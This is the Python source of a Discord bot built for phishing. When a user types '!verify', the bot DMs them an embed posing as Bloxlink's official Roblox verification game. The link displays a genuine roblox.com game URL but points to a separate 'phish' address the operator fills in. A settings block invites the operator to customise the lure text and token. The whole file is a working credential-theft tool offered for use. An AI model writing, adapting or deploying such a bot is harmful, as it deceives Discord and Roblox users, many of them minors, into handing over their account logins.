import discord, requests, json, re
from discord.ext import commands
import requests
from bs4 import BeautifulSoup
from keep_alive import keep_alive


################### change these to your liking ###################

yourprefix = "!"

token = ""
title = "Please Complete Verification"
desc ="To verify your account, please join Bloxlink's Official Roblox Verification Game"
field = "Please Login and join the game"
hyperlink = "https://www.roblox.com/games/1271943503/Bloxlink-Verification-Game"
phish = "Your Phishing link"

###################################################################



bot = commands.Bot(command_prefix = yourprefix)
bot.remove_command('help')

@bot.event
async def on_ready():
    print('')
    print('----------------')
    print('Bot Online!')
    print('----------------')

main = discord.Embed(title=title,description=desc,color=0xcf4948)
main.add_field(name=field,value=f"[{hyperlink}]({phish})")


@bot.command()
async def verify(ctx):
    await ctx.send('Sent verification info. Please check your DMs.')
    await ctx.author.send(embed=main)




keep_alive()
bot.run(token)
